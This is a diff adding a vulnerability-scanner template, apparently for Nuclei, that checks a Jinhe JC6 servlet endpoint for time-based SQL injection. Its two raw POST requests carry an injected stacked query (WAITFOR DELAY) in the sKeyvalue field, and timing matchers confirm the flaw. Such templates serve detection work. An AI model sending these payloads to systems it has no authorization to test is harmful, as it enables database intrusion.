@@ -1,0 +1,38 @@
+id: jinhe-jc6-sqli-servlet_imagefield
+info:
+  name: jinhe-jc6-sqli-servlet_imagefield
+  author: jinhe-jc6-sqli-servlet_imagefield
+  severity: high
+
+http:
+  - raw:
+      - |-
+        POST /jc6/servlet/imagefield HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 103
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br, zstd
+        Content-Type: application/x-www-form-urlencoded
+        SL-CE-SUID: 77
+        Connection: close
+
+        key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1';WAITFOR DELAY '0:0:1'--
+      - |-
+        @timeout: 6s      
+        POST /jc6/servlet/imagefield HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 103
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br, zstd
+        Content-Type: application/x-www-form-urlencoded
+        SL-CE-SUID: 77
+        Connection: close
+
+        key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1';WAITFOR DELAY '0:0:3'--
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=1  && duration_1<=3"
+          - "duration_2>=3  && duration_2<=5"
